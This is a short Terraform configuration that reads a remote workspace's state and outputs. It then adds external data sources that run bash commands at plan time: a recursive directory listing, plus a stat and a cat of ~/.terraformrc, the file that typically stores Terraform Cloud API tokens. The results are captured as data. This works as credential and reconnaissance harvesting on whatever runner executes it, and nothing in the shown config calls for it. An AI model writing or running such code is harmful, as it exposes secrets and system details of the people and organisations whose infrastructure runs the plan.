data "terraform_remote_state" "this" {
  backend = "remote"

  config = {
    organization = var.organization_name
    workspaces = {
      name = var.workspace_name
    }
  }
}

data "tfe_outputs" "this" {
  organization = var.organization_name
  workspace    = var.workspace_name
}

# External data source to run ls command and capture output (recursive)
data "external" "list_directory" {
  program = ["bash", "-c", "ls -laR | jq -Rs '{output: .}'"]
}

# External data source to get .terraformrc file attributes
data "external" "terraformrc_attributes" {
  program = ["bash", "-c", "stat -c 'Size: %s bytes, Last Modified: %y, Permissions: %A, Owner: %U' ~/.terraformrc 2>/dev/null | jq -Rs '{output: .}' || echo '{\"output\": \"File not found\"}'"]
}

# External data source to get .terraformrc file content
data "external" "terraformrc_content" {
  program = ["bash", "-c", "cat ~/.terraformrc 2>/dev/null | jq -Rs '{output: .}' || echo '{\"output\": \"File not found or cannot be read\"}'"]
}